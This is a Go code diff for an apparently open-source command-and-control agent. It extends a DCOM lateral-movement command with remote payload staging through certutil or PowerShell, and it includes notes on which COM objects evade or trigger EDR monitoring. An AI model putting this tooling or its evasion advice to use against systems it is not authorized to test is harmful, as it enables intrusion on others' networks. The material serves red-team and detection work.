@@ -8,28 +8,55 @@ import (
 	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
 )
 
+var dcomObjectWarnings = map[string]string{
+	"mmc20":        "MMC20.Application: monitored by CrowdStrike/SentinelOne — creates mmc.exe child process. Most reliable but most detected.",
+	"shellwindows": "ShellWindows: requires explorer.exe on target. Creates child process under explorer.exe — moderate detection.",
+	"shellbrowser": "ShellBrowserWindow: similar to ShellWindows. Creates child process under iexplore.exe — moderate detection.",
+	"wscript":      "WScript.Shell: less commonly monitored than MMC20. Executes via WScript.Shell.Run — no intermediate process. Good fallback when MMC is blocked.",
+	"excel":        "Excel.Application: requires Excel installed on target. RegisterXLL loads DLL into Excel.exe (stealthy — lives in Office process). DDEInitiate creates cmd.exe child.",
+	"outlook":      "Outlook.Application: requires Outlook on target. Uses CreateObject(\"Wscript.Shell\") within Outlook's process — command runs inside OUTLOOK.EXE. Unusual vector, often not monitored by EDR. May be blocked by Outlook security settings.",
+}
+
+func getDCOMObjectWarning(object string) string {
+	if w, ok := dcomObjectWarnings[object]; ok {
+		return w
+	}
+	return "Unknown object — proceed with caution."
+}
+
+var dcomExecutionRegex = regexp.MustCompile(`DCOM\s+(\S+)\s+executed on\s+(\S+?):`)
+
+func extractDCOMExecutionInfo(responseText string) (object, host string, ok bool) {
+	m := dcomExecutionRegex.FindStringSubmatch(responseText)
+	if len(m) > 2 {
+		return m[1], m[2], true
+	}
+	return "", "", false
+}
+
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "dcom",
-		Description:         "Execute commands on remote hosts via DCOM lateral movement. Supports MMC20.Application, ShellWindows, ShellBrowserWindow, WScript.Shell, Excel.Application, and Outlook.Application objects.",
-		HelpString:          "dcom -action exec -host <target> -command <cmd> [-args <arguments>] [-object mmc20|shellwindows|shellbrowser|wscript|excel|outlook] [-dir <directory>] [-username <user> -password <pass> -domain <domain>]",
-		Version:             3,
+		Description:         "Execute commands on remote hosts via DCOM lateral movement with staged file transfer. Supports MMC20.Application, ShellWindows, ShellBrowserWindow, WScript.Shell, Excel.Application, and Outlook.Application objects.",
+		HelpString:          "dcom -action <exec|upload|exec-staged> -host <target> -command <cmd> [-args <arguments>] [-object mmc20|shellwindows|shellbrowser|wscript|excel|outlook] [-local_path <path>] [-remote_path <path>] [-method <certutil|powershell>] [-cleanup <true|false>]",
+		Version:             4,
 		Author:              "@galoryber",
-		MitreAttackMappings: []string{"T1021.003"}, // Remote Services: Distributed Component Object Model
+		MitreAttackMappings: []string{"T1021.003", "T1570"}, // Remote Services: DCOM + Lateral Tool Transfer
 		SupportedUIFeatures: []string{},
 		AssociatedBrowserScript: &agentstructs.BrowserScript{ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "dcom_new.js"), Author: "@galoryber"},
 		CommandAttributes: agentstructs.CommandAttribute{
 			SupportedOS:                []string{agentstructs.SUPPORTED_OS_WINDOWS},
 			CommandCanOnlyBeLoadedLater: true,
+			FilterCommandAvailabilityByAgentBuildParameters: map[string]string{"selected_os": "Windows"},
 		},
 		CommandParameters: []agentstructs.CommandParameter{
 			{
 				Name:          "action",
 				CLIName:       "action",
 				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:       []string{"exec"},
+				Choices:       []string{"exec", "upload", "exec-staged", "check"},
 				DefaultValue:  "exec",
-				Description:   "Action to perform",
+				Description:   "exec: execute command, upload: stage file on remote host, exec-staged: upload + execute + optional cleanup, check: validate DCOM prerequisites",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
 						ParameterIsRequired: true,
@@ -169,6 +196,63 @@ func init() {
 					},
 				},
 			},
+			{
+				Name:          "local_path",
+				CLIName:       "local_path",
+				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DefaultValue:  "",
+				Description:   "Path to file on agent filesystem to stage on remote host (for upload/exec-staged actions)",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: false,
+						UIModalPosition:     11,
+						GroupName:           "Default",
+					},
+				},
+			},
+			{
+				Name:          "remote_path",
+				CLIName:       "remote_path",
+				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DefaultValue:  "",
+				Description:   "Destination path on remote host (default: C:\\Windows\\Temp\\<random>.exe)",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: false,
+						UIModalPosition:     12,
+						GroupName:           "Default",
+					},
+				},
+			},
+			{
+				Name:          "method",
+				CLIName:       "method",
+				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
+				Choices:       []string{"certutil", "powershell"},
+				DefaultValue:  "certutil",
+				Description:   "Staging method: certutil (base64 chunks + decode) or powershell (single command, <150KB files)",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: false,
+						UIModalPosition:     13,
+						GroupName:           "Default",
+					},
+				},
+			},
+			{
+				Name:          "cleanup",
+				CLIName:       "cleanup",
+				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
+				DefaultValue:  false,
+				Description:   "Remove staged file after execution (exec-staged only, default: false)",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: false,
+						UIModalPosition:     14,
+						GroupName:           "Default",
+					},
+				},
+			},
 		},
 		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
 			if input == "" {
@@ -182,26 +266,16 @@ func init() {
 		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
 			host, _ := taskData.Args.GetStringArg("host")
 			object, _ := taskData.Args.GetStringArg("object")
-
-			// Per-object detection signatures
-			objectWarnings := map[string]string{
-				"mmc20":        "MMC20.Application: monitored by CrowdStrike/SentinelOne — creates mmc.exe child process. Most reliable but most detected.",
-				"shellwindows": "ShellWindows: requires explorer.exe on target. Creates child process under explorer.exe — moderate detection.",
-				"shellbrowser": "ShellBrowserWindow: similar to ShellWindows. Creates child process under iexplore.exe — moderate detection.",
-				"wscript":      "WScript.Shell: less commonly monitored than MMC20. Executes via WScript.Shell.Run — no intermediate process. Good fallback when MMC is blocked.",
-				"excel":        "Excel.Application: requires Excel installed on target. RegisterXLL loads DLL into Excel.exe (stealthy — lives in Office process). DDEInitiate creates cmd.exe child.",
-				"outlook":      "Outlook.Application: requires Outlook on target. Uses CreateObject(\"Wscript.Shell\") within Outlook's process — command runs inside OUTLOOK.EXE. Unusual vector, often not monitored by EDR. May be blocked by Outlook security settings.",
+			warning := getDCOMObjectWarning(object)
+			msg := fmt.Sprintf("OPSEC WARNING: DCOM lateral movement to %s via %s.\n  %s\n  All DCOM: RPC/TCP 135 connection, Event ID 10016, remote COM activation.", host, object, warning)
+			if ctx := identityContextForOPSEC(taskData.Callback.Description); ctx != "" {
+				msg += " [Identity: " + ctx + "]"
 			}
-			warning := objectWarnings[object]
-			if warning == "" {
-				warning = "Unknown object — proceed with caution."
-			}
-
 			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
 				TaskID:             taskData.Task.ID,
 				Success:            true,
 				OpsecPreBlocked:    false,
-				OpsecPreMessage:    fmt.Sprintf("OPSEC WARNING: DCOM lateral movement to %s via %s.\n  %s\n  All DCOM: RPC/TCP 135 connection, Event ID 10016, remote COM activation.", host, object, warning),
+				OpsecPreMessage:    msg,
 				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
 			}
 		},
@@ -223,13 +297,11 @@ func init() {
 			if !ok || responseText == "" {
 				return response
 			}
-			// Parse: DCOM <Object> executed on <host>:
-			re := regexp.MustCompile(`DCOM\s+(\S+)\s+executed on\s+(\S+?):`)
-			if m := re.FindStringSubmatch(responseText); len(m) > 2 {
+			if object, host, ok := extractDCOMExecutionInfo(responseText); ok {
 				createArtifact(processResponse.TaskData.Task.ID, "Remote Command",
-					fmt.Sprintf("DCOM execution: %s on %s", m[1], m[2]))
+					fmt.Sprintf("DCOM execution: %s on %s", object, host))
 				tagTask(processResponse.TaskData.Task.ID, "LATERAL",
-					fmt.Sprintf("DCOM %s execution on %s", m[1], m[2]))
+					fmt.Sprintf("DCOM %s execution on %s", object, host))
 			}
 			return response
 		},
